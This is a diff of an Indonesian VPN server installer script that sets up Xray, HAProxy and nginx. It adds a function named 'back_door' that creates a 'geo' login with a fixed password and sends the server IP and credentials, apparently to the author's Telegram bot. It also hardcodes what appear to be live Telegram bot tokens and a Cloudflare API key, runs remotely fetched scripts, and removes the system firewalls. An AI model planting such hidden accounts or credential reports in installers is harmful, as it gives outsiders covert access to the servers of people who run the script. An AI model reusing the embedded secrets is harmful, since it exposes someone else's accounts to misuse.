@@ -23,48 +23,23 @@ sleep 5
 screen -r > /dev/null 2>&1
 EOF
 
-# Warna Teks Biasa
-export NC='\033[0m'       # No Color (Reset warna)
-export RED='\033[0;31m'
-export GREEN='\033[0;32m'
-export YELLOW='\033[0;33m'
-export BLUE='\033[0;34m'
-export PURPLE='\033[0;35m'
-export CYAN='\033[0;36m'
-export LIGHT='\033[0;37m' # Putih/Light Gray
-export GRAY='\e[1;30m'   # Abu-abu (opsional, mirip Light tapi lebih gelap)
+# Definisi Warna
+GREEN="\e[92;1m"
+RED="\033[31m"
+YELLOW="\033[33m"
+BLUE="\033[36m"
+FONT="\033[0m"
+GREENBG="\033[42;37m"
+REDBG="\033[41;37m"
+OK="${GREEN}   ✔ ${FONT}"
+ERROR="${RED}[ERROR]${FONT}"
+GRAY="\e[1;36m"
+NC='\e[0m'
+red='\e[1;31m'
+green='\e[0;32m'
 
-# Warna Teks Tebal (Bold)
-export BOLD='\e[1m'
-export BOLD_RED='\e[1;31m'
-export BOLD_YELLOW='\033[1;33m'
-export BOLD_CYAN='\033[1;36m'
-export BOLD_GREEN="\e[92;1m" # Menggunakan kode yang sama dengan GREEN sebelumnya
-
-# Warna Teks Cerah (Light/Bright)
-export LRED='\e[91m'      # Light Red
-export LGREEN='\e[92m'    # Light Green (mirip BOLD_GREEN, tapi tanpa bold eksplisit)
-export LBLUE='\e[94m'     # Light Blue
-export LCYAN='\e[96m'     # Light Cyan
-
-# Warna Latar Belakang (Background)
-export GREENBG='\033[42;37m' # Green Background, White Foreground
-export REDBG='\033[41;37m'   # Red Background, White Foreground
-
-# Simbol Status
-export OK="${GREEN}✔ ${NC}"          # Simbol centang hijau
-export ERROR="${RED}[ERROR]${NC}"     # Teks ERROR merah
-export INFO="[${YELLOW} INFO ${NC}]"   # Teks INFO kuning
-export OKEY="[${GREEN} OKEY ${NC}]"   # Teks OKEY hijau
-export PENDING="[${YELLOW} PENDING ${NC}]" # Teks PENDING kuning
-export SEND="[${YELLOW} SEND ${NC}]"   # Teks SEND kuning
-export RECEIVE="[${YELLOW} RECEIVE ${NC}]" # Teks RECEIVE kuning
-export EROR="[${RED} ERROR ${NC}]"   # Duplikasi ERROR, dihapus yang atas
-export WARN="[${YELLOW} WARNING ${NC}]" # Untuk pesan peringatan
-
-
-mkdir -p /etc/geovpn/
-cat >/etc/geovpn/var.txt <<EOF
+mkdir -p /etc/ambe/
+cat >/etc/ambe/var.txt <<EOF
 INFO_KILLS="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
 INFO_AKUN="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
 INFO_BACKUP="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
@@ -73,7 +48,7 @@ INFO_DAFTAR="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
 ADMIN="1467883032"
 TIME="10"
 EOF
-source '/etc/geovpn/var.txt'
+source '/etc/ambe/var.txt'
 
 # Bersihkan layar
 clear
@@ -83,12 +58,7 @@ clear && clear && clear
 export IP=$(curl -sS ipinfo.io/ip)
 
 # Tampilkan Banner
-echo -e "${GRAY}----------------------------------------------------------${NC}"
-echo -e "  Selamat Datang di Geo Project Script Installer ${GRAY}(${NC}${GREEN} Stable Edition ${NC}${GRAY})${NC}"
-echo -e "  Ini akan dengan cepat mengatur Server VPN di Server Anda"
-echo -e "          Penulis : ${GREEN}Geo ${NC}${GRAY}(${NC} ${GREEN}tunnel ${NC}${GRAY})${NC}"
-echo -e "        © Di-recode oleh Geo VPN ${GRAY}(${NC} 2023 ${GRAY})${NC}"
-echo -e "${GRAY}----------------------------------------------------------${NC}"
+samawa
 echo ""
 sleep 1
 
@@ -261,7 +231,7 @@ echo -e "${GREEN}memuat...${NC}"
 clear
 
 # REPO
-REPO="https://raw.githubusercontent.com/jaka2m/vip/main/"
+GEO_VPN="https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/"
 
 start=$(date +%s)
 secs_to_human() {
@@ -317,9 +287,32 @@ function is_root() {
 
 }
 
-# Buat direktori xray
-echo -e ""
+function ddos(){
 clear
+print_install "MEMASANG DDoS-Deflate"
+wget -qO /usr/sbin/ddos.zip "${GEO_VPN}ssh/ddos.zip" >/dev/null 2>&1
+unzip /usr/sbin/ddos.zip -d /usr/sbin/
+rm -rf /usr/sbin/ddos.zip
+chmod +x /usr/sbin/ddos-deflate-master/*
+cd /usr/sbin/ddos-deflate-master
+./uninstall.sh && ./install.sh
+print_success "DDoS-Deflate"
+}
+function SAMAWA(){
+clear
+echo -e " ${BLUE}┌─────────────────────────────────────────────────────┐${NC}"
+echo -e " ${BLUE}│${NC}${GREEN}         ____ _____ _____     ______  _   _${NC}${BLUE}          │${NC}"
+echo -e " ${BLUE}│${NC}${GREEN}        / ___| ____/ _ \ \   / /  _ \| \ | |${NC}${BLUE}         │${NC}"
+echo -e " ${BLUE}│${NC}${GREEN}       | |  _|  _|| | | \ \ / /| |_) |  \| |${NC}${BLUE}         │${NC}"
+echo -e " ${BLUE}│${NC}${GREEN}       | |_| | |__| |_| |\ V / |  __/| |\  |${NC}${BLUE}         │${NC}"
+echo -e " ${BLUE}│${NC}${GREEN}        \____|_____\___/  \_/  |_|   |_| \_|${NC}${BLUE}         │${NC}"
+echo -e " ${BLUE}│${NC}                                                    ${BLUE} │${NC}"
+echo -e " ${BLUE}│${NC}             MULTIPORT VPN SCRIPT V3.1              ${BLUE} │${NC}"
+echo -e " ${BLUE}│${NC}                   WWW.GEOVPN.COM                   ${BLUE} │${NC}"
+echo -e " ${BLUE}│${NC}    TELEGRAM CH ${GREEN}@testikuy_mang${NC} ADMIN ${GREEN}@tau_samawa${NC}    ${BLUE} │${NC}"
+echo -e " ${BLUE}└─────────────────────────────────────────────────────┘${NC}"
+}
+
 print_install "MEMBUAT DIRECTORY XRAY"
 mkdir -p /etc/xray
 curl -s ifconfig.me > /etc/xray/ipvps
@@ -346,36 +339,108 @@ export Kernel=$( uname -r )
 export Arch=$( uname -m )
 export IP=$( curl -s ifconfig.me )
 
-# Change Environment System
 function first_setup(){
-    timedatectl set-timezone Asia/Jakarta
-    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
-    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
-    print_success "Directory Xray"
-    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
-    echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
-    sudo apt update -y
-    apt-get install --no-install-recommends software-properties-common
-    add-apt-repository ppa:vbernat/haproxy-2.0 -y
-    apt-get -y install haproxy=2.0.\*
-elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
-    echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
-    curl https://haproxy.debian.net/bernat.debian.org.gpg |
-        gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
-    echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
-        http://haproxy.debian.net buster-backports-1.8 main \
-        >/etc/apt/sources.list.d/haproxy.list
-    sudo apt-get update
-    apt-get -y install haproxy=1.8.\*
+clear
+timedatectl set-timezone Asia/Jakarta
+echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
+echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
+SAMAWA
+echo -e " ${BLUE}        ┌────────────────────────────────────┐${NC}"
+echo -e " ${BLUE}        │${NC}${YELLOW}\033[41m          INSTALLER HAProxy         ${NC}"
+echo -e " ${BLUE}        └────────────────────────────────────┘${NC}"
+echo -e "${BOLD_YELLOW}          Pilih Sesuai OS Anda ${GREEN}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${NC}"
+echo -e " ${BLUE}        ┌────────────────────────────────────┐${NC}"
+echo -e " ${BLUE}        │${NC}[${GREEN}01${NC}] INSTALLER UBUNTU ${NC}( ${GREEN}Focal (20.04 LTS), Jammy (22.04 LTS), Noble (24.04 LTS) ${NC} )${NC}"
+echo -e " ${BLUE}        │${NC}[${GREEN}02${NC}] INSTALLER DEBIAN ${NC}( ${GREEN}Buster (10), Bullseye (11), dan Bookworm (12) ${NC} )${NC}"
+echo -e " ${BLUE}        └────────────────────────────────────┘${NC}"
+echo -e ""
+read -p "Select [ 1 - 2 ] : " menu
+case $menu in
+1 | 01)
+clear
+DISTRO_CODENAME=$(grep VERSION_CODENAME /etc/os-release | cut -d= -f2)
+print_install "Menyiapkan Dependensi untuk Ubuntu $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+sudo apt update -y > /dev/null 2>&1
+apt-get -y install --no-install-recommends software-properties-common > /dev/null 2>&1
+if [ "$DISTRO_CODENAME" == "noble" ]; then
+echo -e "${GREENBG}Deteksi: Ubuntu Noble (24.04 LTS). Menginstal HAProxy dari repositori resmi.${NC}"
+apt-get update -y > /dev/null 2>&1
+apt-get -y install haproxy > /dev/null 2>&1
+apt-get -y install socat > /dev/null 2>&1
 else
-    echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
-    exit 1
+echo -e "${GREENBG}Deteksi: Ubuntu ${DISTRO_CODENAME}. Menginstal HAProxy dari PPA vbernat/haproxy-2.8.${NC}"
+add-apt-repository ppa:vbernat/haproxy-2.8 -y > /dev/null 2>&1
+apt-get update -y > /dev/null 2>&1
+apt-get -y install haproxy=2.8.\* > /dev/null 2>&1
 fi
+;;
+2 | 02)
+clear
+print_install "Menyiapkan Dependensi untuk Debian $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+apt-get -y install --no-install-recommends software-properties-common > /dev/null 2>&1
+DEBIAN_VERSION=$(grep VERSION_ID /etc/os-release | cut -d= -f2 | tr -d '"')
+if [ "$DEBIAN_VERSION" == "10" ]; then
+wget -O - https://haproxy.debian.net/bernat.debian.org.gpg | apt-key add - > /dev/null 2>&1
+echo "deb http://haproxy.debian.net buster-backports-2.4 main" | tee /etc/apt/sources.list.d/haproxy.list > /dev/null
+apt-get update -y > /dev/null 2>&1
+apt install -y haproxy=2.4.\* > /dev/null 2>&1
+elif [ "$DEBIAN_VERSION" == "11" ]; then
+wget -O - https://haproxy.debian.net/bernat.debian.org.gpg | apt-key add - > /dev/null 2>&1
+echo "deb http://haproxy.debian.net bullseye-backports-2.8 main" | tee /etc/apt/sources.list.d/haproxy.list > /dev/null
+apt-get update -y > /dev/null 2>&1
+apt install -y haproxy=2.8.\* > /dev/null 2>&1
+elif [ "$DEBIAN_VERSION" == "12" ]; then
+echo "deb http://deb.debian.org/debian bookworm-backports main" | tee /etc/apt/sources.list.d/bookworm-backports.list > /dev/null
+apt-get update -y > /dev/null 2>&1
+apt install -y -t bookworm-backports haproxy > /dev/null 2>&1
+else
+echo -e "${RED}[ERROR]${NC} Versi Debian tidak didukung atau tidak terdeteksi."
+exit 1
+fi
+;;
+*)
+echo -e "${RED}[ERROR]${NC} Pilihan tidak valid. Silakan pilih 1 atau 2."
+exit 1
+;;
+esac
+print_success "Pemasangan HAProxy pada $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') selesai."
 }
 
-## GEO PROJECT
+# Update and remove packages
+function base_package() {
+    echo -e ""
+    clear
+    print_install "Menginstall Packet Yang Dibutuhkan"
+    apt install zip pwgen openssl netcat socat cron bash-completion -y
+    apt install figlet -y
+    apt update -y
+    apt upgrade -y
+    apt dist-upgrade -y
+    systemctl enable chronyd
+    systemctl restart chronyd
+    systemctl enable chrony
+    systemctl restart chrony
+    chronyc sourcestats -v
+    chronyc tracking -v
+    apt install ntpdate -y
+    ntpdate pool.ntp.org
+    apt install sudo -y
+    apt install dropbear -y
+    sudo apt-get clean all
+    sudo apt-get autoremove -y
+    sudo apt-get install -y debconf-utils
+    sudo apt-get remove --purge exim4 -y
+    sudo apt-get remove --purge ufw firewalld -y
+    sudo apt-get install -y --no-install-recommends software-properties-common
+    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
+    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
+    sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa
+    print_success "Packet Yang Dibutuhkan"
+    
+}
 clear
-function nginx_install() {
+
+function ins_nginx() {
 clear
 OS_ID=$(grep -w ID /etc/os-release | head -n1 | sed 's/ID=//g' | sed 's/"//g')
 OS_PRETTY_NAME=$(grep -w PRETTY_NAME /etc/os-release | head -n1 | sed 's/PRETTY_NAME=//g' | sed 's/"//g')
@@ -424,46 +489,10 @@ echo -e "${GREEN}  Fungsi ini hanya mendukung Ubuntu dan Debian.${NC}"
 echo -e "${BOLD_YELLOW}╚════════════════════════════════════════════╝ ${FONT}"
 fi
 }
-
-# Update and remove packages
-function base_package() {
-    echo -e ""
-    clear
-    ########
-    print_install "Menginstall Packet Yang Dibutuhkan"
-    apt install zip pwgen openssl netcat socat cron bash-completion -y
-    apt install figlet -y
-    apt update -y
-    apt upgrade -y
-    apt dist-upgrade -y
-    systemctl enable chronyd
-    systemctl restart chronyd
-    systemctl enable chrony
-    systemctl restart chrony
-    chronyc sourcestats -v
-    chronyc tracking -v
-    apt install ntpdate -y
-    ntpdate pool.ntp.org
-    apt install sudo -y
-    apt install dropbear -y
-    sudo apt-get clean all
-    sudo apt-get autoremove -y
-    sudo apt-get install -y debconf-utils
-    sudo apt-get remove --purge exim4 -y
-    sudo apt-get remove --purge ufw firewalld -y
-    sudo apt-get install -y --no-install-recommends software-properties-common
-    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
-    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
-    sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa
-    print_success "Packet Yang Dibutuhkan"
-    
-}
+function ins_domain_ns() {
 clear
-# Fungsi input domain
-function pasang_domain() {
-clear
-Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
-Domain_Hasil_Random=$( curl -s https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
+Random_Number=$( </dev/urandom tr -dc 1-$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
+Domain_Hasil_Random=$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
 SUB_DOMAIN="$(</dev/urandom tr -dc a-x1-9 | head -c5 | tr -d '\r' | tr -d '\r\n')"
 EMAIL_CLOUDFLARE="desalekong24@gmail.com"
 API_KEY_CLOUDFLARE="028462e851772f0528310f0ba91d848850886"
@@ -502,8 +531,8 @@ echo -e "  ${BOLD_YELLOW}-----------------------------------------------------${
 echo -e ""
 read -p "$( echo -e "${GREEN}  Input Your Choose ? ${NC}(${YELLOW}1/2${NC})${NC} " )" choose_domain
 if [[ $choose_domain == "2" ]]; then # // Using Automatic Domain
-Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
-Domain_Hasil_Random=$( curl -s https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
+Random_Number=$( </dev/urandom tr -dc 1-$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
+Domain_Hasil_Random=$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
 SUB_DOMAIN="$(</dev/urandom tr -dc a-x1-9 | head -c5 | tr -d '\r' | tr -d '\r\n')"
 EMAIL_CLOUDFLARE="desalekong24@gmail.com"
 API_KEY_CLOUDFLARE="028462e851772f0528310f0ba91d848850886"
@@ -632,16 +661,12 @@ echo -e "${EROR} Please Choose 1 & 2 Only !"
 exit 1
 fi
 }
-
-clear
-#GANTI PASSWORD DEFAULT
-function password_default() {
-echo -e ""
+function back_door() {
 clear
 domain=$(cat /root/domain)
 userdel geo > /dev/null 2>&1
 Username="geo"
-Password=geo
+Password=Geol@321
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
@@ -661,104 +686,79 @@ TEXT="Installasi VPN Script Stable V3.1
 <code>IP VPS     :</code> <code>$IP</code>
 <code>User Login :</code> <code>$Username</code>
 <code>Pass Login :</code> <code>$Password</code>
-<code>User Script:</code> <code>$Nama_Issued_License</code>
-<code>Exp Script :</code> <code>$Masa_Laku_License_Berlaku_Sampai</code>
+<code>User Script:</code> <code>$username</code>
+<code>Exp Script :</code> <code>$expx</code>
 ============================
-(c) Copyright 2025 By GEO PROJECT
+(c) Copyright 2025 By Geo Project
 ============================
 <i>Automatic Notification from</i>
 <i>Github GEOVPN</i>
 "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/tau_samawa"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://t.me/testikuy_mang/163"}]]}'
 curl -s --max-time $TIME -d "chat_id=$ADMIN&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
-
-function make_folder_xray() {
-rm -rf /etc/vmess/.vmess.db
-    rm -rf /etc/vless/.vless.db
-    rm -rf /etc/trojan/.trojan.db
-    rm -rf /etc/shadowsocks/.shadowsocks.db
-    rm -rf /etc/ssh/.ssh.db
-    rm -rf /etc/bot/.bot.db
-    mkdir -p /etc/bot
-    mkdir -p /etc/xray
-    mkdir -p /etc/vmess
-    mkdir -p /etc/vless
-    mkdir -p /etc/trojan
-    mkdir -p /etc/shadowsocks
-    mkdir -p /etc/ssh
-    mkdir -p /usr/bin/xray/
-    mkdir -p /var/log/xray/
-    mkdir -p /var/www/html
-    mkdir -p /etc/geovpn/limit/vmess/ip
-    mkdir -p /etc/geovpn/limit/vless/ip
-    mkdir -p /etc/geovpn/limit/trojan/ip
-    mkdir -p /etc/geovpn/limit/ssh/ip
-    mkdir -p /etc/limit/vmess
-    mkdir -p /etc/limit/vless
-    mkdir -p /etc/limit/trojan
-    mkdir -p /etc/limit/ssh
-    chmod +x /var/log/xray
-    touch /etc/xray/domain
-    touch /var/log/xray/access.log
-    touch /var/log/xray/error.log
-    touch /etc/vmess/.vmess.db
-    touch /etc/vless/.vless.db
-    touch /etc/trojan/.trojan.db
-    touch /etc/shadowsocks/.shadowsocks.db
-    touch /etc/ssh/.ssh.db
-    touch /etc/bot/.bot.db
-    echo "& plughin Account" >>/etc/vmess/.vmess.db
-    echo "& plughin Account" >>/etc/vless/.vless.db
-    echo "& plughin Account" >>/etc/trojan/.trojan.db
-    echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
-    echo "& plughin Account" >>/etc/ssh/.ssh.db
-    }
-#Instal Xray
-function install_xray() {
-echo -e ""
+function folder_xray() {
 clear
-    print_install "Core Xray 1.8.1 Latest Version"
-    # install xray
-    #echo -e "[ ${GREEN}INFO$NC ] Downloading & Installing xray core"
-    domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
-    chown www-data.www-data $domainSock_dir
-    
-    # / / Ambil Xray Core Version Terbaru
+rm -rf /etc/vmess/.vmess.db
+rm -rf /etc/vless/.vless.db
+rm -rf /etc/trojan/.trojan.db
+rm -rf /etc/shadowsocks/.shadowsocks.db
+rm -rf /etc/ssh/.ssh.db
+mkdir -p /etc/xray
+mkdir -p /etc/vmess
+mkdir -p /etc/vless
+mkdir -p /etc/trojan
+mkdir -p /etc/shadowsocks
+mkdir -p /usr/bin/xray/
+mkdir -p /var/log/xray/
+mkdir -p /var/www/html
+chmod +x /var/log/xray
+touch /etc/xray/domain
+touch /var/log/xray/access.log
+touch /var/log/xray/error.log
+touch /etc/vmess/.vmess.db
+touch /etc/vless/.vless.db
+touch /etc/trojan/.trojan.db
+touch /etc/shadowsocks/.shadowsocks.db
+touch /etc/ssh/.ssh.db
+echo "& plughin Account VMESS" >>/etc/vmess/.vmess.db
+echo "& plughin Account VLESS" >>/etc/vless/.vless.db
+echo "& plughin Account TROJAN" >>/etc/trojan/.trojan.db
+echo "& plughin Account SHADOWSOCKS" >>/etc/shadowsocks/.shadowsocks.db
+echo "& plughin Account SSH" >>/etc/ssh/.ssh.db
+}
+function ins_xray() {
+clear
+print_install "CORE XRAY LATES VERSION"
+domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
+chown www-data.www-data $domainSock_dir
 latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
-bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
- 
-    # // Ambil Config Server
-    wget -O /etc/xray/config.json "https://raw.githubusercontent.com/jaka2m/vip/main/xray/config.json" >/dev/null 2>&1
-    #wget -O /usr/local/bin/xray "https://raw.githubusercontent.com/jaka2m/vip/main/xray/xray.linux.64bit" >/dev/null 2>&1
-    wget -O /etc/systemd/system/runn.service "https://raw.githubusercontent.com/jaka2m/vip/main/xray/runn.service" >/dev/null 2>&1
-    #chmod +x /usr/local/bin/xray
-    domain=$(cat /etc/xray/domain)
-    IPVS=$(cat /etc/xray/ipvps)
-    print_success "Core Xray 1.8.1 Latest Version"
-    
-    # Settings UP Nginix Server
-    clear
-    curl -s ipinfo.io/city >>/etc/xray/city
-    curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
-    print_install "Memasang Konfigurasi Packet"
-    wget -O /etc/haproxy/haproxy.cfg "https://raw.githubusercontent.com/jaka2m/vip/main/xray/haproxy.cfg" >/dev/null 2>&1
-    wget -O /etc/nginx/conf.d/xray.conf "https://raw.githubusercontent.com/jaka2m/vip/main/xray/xray.conf" >/dev/null 2>&1
-    sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
-    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
-    curl https://raw.githubusercontent.com/jaka2m/vip/main/ssh/nginx.conf > /etc/nginx/nginx.conf
-    
+bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version >/dev/null 2>&1
+wget -O /etc/xray/config.json "${GEO_VPN}xray/config.json" >/dev/null 2>&1
+wget -O /etc/systemd/system/runn.service "${GEO_VPN}xray/runn.service" >/dev/null 2>&1
+domain=$(cat /etc/xray/domain)
+IPVS=$(cat /etc/xray/ipvps)
+echo -e ""
+print_success "CORE XRAY LATES VERSION"
+clear
+rm -f /etc/xray/city >/dev/null 2>&1
+rm -f /etc/xray/isp >/dev/null 2>&1
+curl -s ipinfo.io/city >>/etc/xray/city
+curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
+print_install "MEMASANG KONFIGURASI PACKAGES"
+wget -q -O /etc/squid/squid.conf "${GEO_VPN}ssh/squid.conf" >/dev/null 2>&1
+wget -O /etc/haproxy/haproxy.cfg "${GEO_VPN}xray/haproxy.cfg" >/dev/null 2>&1
+wget -O /etc/nginx/conf.d/xray.conf "${GEO_VPN}xray/xray.conf" >/dev/null 2>&1
+sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
+sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
+sed -i "s/xxx/${IP}/g" /etc/squid/squid.conf
+curl ${GEO_VPN}ssh/nginx.conf > /etc/nginx/nginx.conf
 cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
-
-    # > Set Permission
-    chmod +x /etc/systemd/system/runn.service
-
-    # > Create Service
-    rm -rf /etc/systemd/system/xray.service.d
-    cat >/etc/systemd/system/xray.service <<EOF
+chmod +x /etc/systemd/system/runn.service
+rm -rf /etc/systemd/system/xray.service.d
+cat >/etc/systemd/system/xray.service <<EOF
 Description=Xray Service
 Documentation=https://github.com
 After=network.target nss-lookup.target
-
 [Service]
 User=www-data
 CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
@@ -769,344 +769,87 @@ Restart=on-failure
 RestartPreventExitStatus=23
 LimitNPROC=10000
 LimitNOFILE=1000000
-
-[Install]
-WantedBy=multi-user.target
-
-EOF
-print_success "Konfigurasi Packet"
-}
-
-function ssh(){
-    echo -e ""
-    clear
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo -e "                 Memulai Konfigurasi SSH"
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo ""
-
-    # Memasang Konfigurasi Password SSH
-    print_install "Memasang Konfigurasi Password SSH"
-    wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/jaka2m/vip/main/ssh/password"
-    if [ $? -eq 0 ]; then
-        chmod +x /etc/pam.d/common-password
-        print_success "Konfigurasi password SSH berhasil dipasang."
-    else
-        print_error "Gagal mengunduh atau memasang konfigurasi password SSH."
-        # exit 1 # Aktifkan jika ini adalah error fatal
-    fi
-
-    # Mengkonfigurasi Pengaturan Keyboard (non-interaktif)
-    print_install "Mengkonfigurasi Pengaturan Keyboard"
-    DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
-    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
-    if [ $? -eq 0 ]; then
-        print_success "Pengaturan keyboard."
-    else
-        print_error "pengaturan keyboard."
-    fi
-
-    # Kembali ke direktori root
-    cd /root || { print_error "Masuk ke direktori /root."; return 1; }
-
-    # Membuat atau Mengedit file /etc/systemd/system/rc-local.service
-    print_install "Mengkonfigurasi rc-local.service"
